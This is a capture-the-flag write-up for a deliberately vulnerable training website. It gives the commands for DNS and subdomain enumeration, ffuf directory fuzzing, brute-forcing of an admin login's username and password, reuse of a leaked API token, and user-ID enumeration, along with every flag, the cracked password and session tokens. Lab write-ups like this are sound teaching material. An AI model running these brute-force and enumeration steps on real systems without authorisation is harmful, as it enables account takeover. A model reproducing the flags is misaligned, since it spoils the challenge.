---
ctf: cft_challenges
competition: false
categories: [web]
tools: [nslookup, dnsrecon, curl, fuff, seq]
url: https://ctfchallenge.com/challenges/6
points: 900
captured: 2022-05-05
flag: [^FLAG^BED649C4DB2DF265BD29419C13D82117^FLAG^, ^FLAG^E858ED9649E57BECE9ACD1A4C60D3446^FLAG^, ^FLAG^047524FE61AE6B5FD1D184994C7322FC^FLAG^, ^FLAG^2B22E2CB70E218510802B0359488F6A2^FLAG^, ^FLAG^93D7491FB4B054FB5C5AC3E0292BE41C^FLAG^, ^FLAG^F6A691584431F9F2C29A3A2DE85A2210^FLAG^, ^FLAG^0BDC60CC5E283476E7107C814C18DCCF^FLAG^, ^FLAG^7B3A24F3368E71842ED7053CF1E51BB0^FLAG^, ^FLAG^3D82BE780F46EE86CE060D23E6E80639^FLAG^]
summary: An introductory vulnerable website to learn about DNS records, sudomain and password bruteforcing, and account takeover.
---
## Flag 1 
```
[^FLAG^BED649C4DB2DF265BD29419C13D82117^FLAG^]
```
- Subdomain Discovery: DNS Server Records
	- Interrogate DNS to discover subdomains to get an idea about the size and scale of the application using `nslookup`
		- You may find `TXT` record, for example, that tells us information like how a domain might protect against spam or a string that authentications 3rd party services
- Use `nslookup` to find a `TXT` record that contains a flag

```shell
nslookup -type=any vulnbegin.co.uk 8.8.8.8
```

## Flag 2 
```
[^FLAG^E858ED9649E57BECE9ACD1A4C60D3446^FLAG^]
```
-  Subdomain Discovery: DNS Bruteforce
	- Try to find subdomains by fuzzing using `dnsrecon` and the `subdomains.txt` file and seeing if we can pull a record from it.
- Brute force domains (using `dnsrecon`) to find `server.vulnbegin.co.uk`. Visit it and be sure to set the cookie.
		
```shell
dnsrecon -d vulnbegin.co.uk -D ~/wordlists/subdomains.txt -t brt
```

## Flag 3
```
[^FLAG^047524FE61AE6B5FD1D184994C7322FC^FLAG^]
```
- Subdomain Discovery: SSL Cert Records
	- A public record gets created whenever an SSL certificate is generated for a website, i.e., if you have an SSL, someone will be able to find the subdomain
	- [https://crt.sh](https://crt.sh) is an online database to search for registered SSL certs
- Search [https://crt.sh](https://crt.sh) for SSL certs for subdomains to find `http://v64hss83.vulnbegin.co.uk/`. Visit it and be sure to set the cookie.
	
```shell
curl https://crt.sh/json?q=vulnbegin.co.uk | jq .
curl -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnNjSFpxZG1kc01DSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJlZGJlNGM2N2RhZjllYTMxZTAwNGI4MjVkNDFiNzEyMSJ9" http://v64hss83.vulnbegin.co.uk/
```

## Flag 4
```
[^FLAG^2B22E2CB70E218510802B0359488F6A2^FLAG^]
```
- Fuzz for subdirectories and files using `fuff`  using the `content.txt` wordlist to find `/robots.txt`. Once there, you'll find `/secret_d1rect0ry`. Visit it and be sure to set the cookie.

```shell
ffuf -w ~/wordlists/content.txt -t 1 -p 0.1 -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnNjSFpxZG1kc01DSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJlZGJlNGM2N2RhZjllYTMxZTAwNGI4MjVkNDFiNzEyMSJ9" -u http://www.vulnbegin.co.uk/FUZZ -mc all -fc 404

cpadmin                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 24ms]
css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 23ms]
js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 25ms]
robots.txt              [Status: 200, Size: 41, Words: 3, Lines: 2, Duration: 24ms]

curl 'http://vulnbegin.co.uk/secret_d1rect0y/' -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnNjSFpxZG1kc01DSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJlZGJlNGM2N2RhZjllYTMxZTAwNGI4MjVkNDFiNzEyMSJ9" 
```

## Flag 5
```
[^FLAG^93D7491FB4B054FB5C5AC3E0292BE41C^FLAG^]
```
- After fuzzing, visit `/cpadmin`, which will redirect to a login page at `/cpadmin/login`. Use `fuff` to brute force the form.
- Fuzz the username using `fuff`  using the `Username is invalid` as a failure test string to find the `admin` username. Then fuzz the password using `fuff`  using the `Password is invalid` as a failure test string. Then login.

```shell
ffuf -w ~/wordlists/usernames.txt -X POST -d "username=FUZZ&password=x" -t 1 -p 0.1 -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnNjSFpxZG1kc01DSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJlZGJlNGM2N2RhZjllYTMxZTAwNGI4MjVkNDFiNzEyMSJ9" -H "Content-Type: application/x-www-form-urlencoded" -u http://www.vulnbegin.co.uk/cpadmin/login -fr 'Username is invalid'
________________________________________________
admin                   [Status: 200, Size: 1483, Words: 422, Lines: 37]

ffuf -w ~/wordlists/passwords.txt -X POST -d "username=admin&password=FUZZ" -t 1 -p 0.1 -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnNjSFpxZG1kc01DSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJlZGJlNGM2N2RhZjllYTMxZTAwNGI4MjVkNDFiNzEyMSJ9" -H "Content-Type: application/x-www-form-urlencoded" -u http://www.vulnbegin.co.uk/cpadmin/login -fr 'Password is invalid'
________________________________________________
159753                  [Status: 302, Size: 0, Words: 1, Lines: 1]
```

## Flag 6
```
[^FLAG^F6A691584431F9F2C29A3A2DE85A2210^FLAG^]
```
- When logged into `/cpadmin`, scan the `/cpadmin` directory using the cookie token that gets set in the browser. This reveals `/cpadmin/env` which is a JSON file that contains a flag and an `api-key`

```shell
$ffuf -w ~/wordlists/content.txt -t 1 -p 0.1 -H "Cookie: token=2eff535bd75e77b62c70ba1e4dcb2873; ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnNjSFpxZG1kc01DSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJlZGJlNGM2N2RhZjllYTMxZTAwNGI4MjVkNDFiNzEyMSJ9" -u http://www.vulnbegin.co.uk/cpadmin/FUZZ -mc all -fc 404 run
________________________________________________
env                     [Status: 200, Size: 111, Words: 2, Lines: 1]

curl 'http://vulnbegin.co.uk/cpadmin/env' -H 'Cookie: token=2eff535bd75e77b62c70ba1e4dcb2873;ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnNjSFpxZG1kc01DSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJlZGJlNGM2N2RhZjllYTMxZTAwNGI4MjVkNDFiNzEyMSJ9'
```

## Flag 7
```
[^FLAG^0BDC60CC5E283476E7107C814C18DCCF^FLAG^]
```
- Visiting `/cpadmin/env` gave us an `X-Token` API key. If we set that as a header to a request back to the `server` subdomain (where we originally got  a flag but also a "User Not Authenticated" error), we then get a new flag and a "User Authenticated" message.

```shell
curl -H "X-Token: 492E64385D3779BC5F040E2B19D67742" -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnNjSFpxZG1kc01DSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJlZGJlNGM2N2RhZjllYTMxZTAwNGI4MjVkNDFiNzEyMSJ9" http://server.vulnbegin.co.uk
```

## Flag 8
```
[^FLAG^7B3A24F3368E71842ED7053CF1E51BB0^FLAG^]
```
- Now that we have the `X-Token` header, we can fuzz for any files or directories that not return a `200`  on the `server` subdomain using the `content.txt` wordlist. 
- This reveals a `/user` endpoint. Visiting `/user` with our `X-Token` header reveals a JSON payload containing a new `/user/27` endpoint.
- This returns yet another JSON payload with a `vulbegin_website` username and `/user/27/info` endpoint
- This returns yet another JSON payload, this time containing a flag.

```shell
ffuf -w ~/wordlists/content.txt -t 1 -p 0.1 -H "X-Token: 492E64385D3779BC5F040E2B19D67742" -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnNjSFpxZG1kc01DSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJlZGJlNGM2N2RhZjllYTMxZTAwNGI4MjVkNDFiNzEyMSJ9" -u http://server.vulnbegin.co.uk/FUZZ -mc all -fc 404
________________________________________________
user                    [Status: 200, Size: 89, Words: 1, Lines: 1]

curl -H "X-Token: 492E64385D3779BC5F040E2B19D67742" -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnNjSFpxZG1kc01DSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJlZGJlNGM2N2RhZjllYTMxZTAwNGI4MjVkNDFiNzEyMSJ9" http://server.vulnbegin.co.uk/user

curl -H "X-Token: 492E64385D3779BC5F040E2B19D67742" -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnNjSFpxZG1kc01DSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJlZGJlNGM2N2RhZjllYTMxZTAwNGI4MjVkNDFiNzEyMSJ9" http://server.vulnbegin.co.uk/user/27

curl -H "X-Token: 492E64385D3779BC5F040E2B19D67742" -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnNjSFpxZG1kc01DSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJlZGJlNGM2N2RhZjllYTMxZTAwNGI4MjVkNDFiNzEyMSJ9" http://server.vulnbegin.co.uk/user/27/info
```

## Flag 9
```
[^FLAG^3D82BE780F46EE86CE060D23E6E80639^FLAG^]
```
- Now that we know about the `/user/:id` endpoint, we can fuzz for any other users who we might be able to see.
- This reveals `/user/5`. When we visit it, we get a 403 authentication error.
- We also know about `/user/:id/info`, when we visit that, we get a JSON payload that contains a username of `"admin"`, a description, and a flag.

```shell
seq 1 100 | ffuf -w - -t 1 -p 0.1 -H "X-Token: 492E64385D3779BC5F040E2B19D67742" -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnNjSFpxZG1kc01DSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJlZGJlNGM2N2RhZjllYTMxZTAwNGI4MjVkNDFiNzEyMSJ9" -u http://server.vulnbegin.co.uk/user/FUZZ -mc all -fc 404
________________________________________________

5                       [Status: 403, Size: 48, Words: 9, Lines: 1]
27                      [Status: 200, Size: 70, Words: 1, Lines: 1]

curl -H "X-Token: 492E64385D3779BC5F040E2B19D67742" -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnNjSFpxZG1kc01DSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJlZGJlNGM2N2RhZjllYTMxZTAwNGI4MjVkNDFiNzEyMSJ9" http://server.vulnbegin.co.uk/user/5

curl -H "X-Token: 492E64385D3779BC5F040E2B19D67742" -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnNjSFpxZG1kc01DSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJlZGJlNGM2N2RhZjllYTMxZTAwNGI4MjVkNDFiNzEyMSJ9" http://server.vulnbegin.co.uk/user/5/info
```
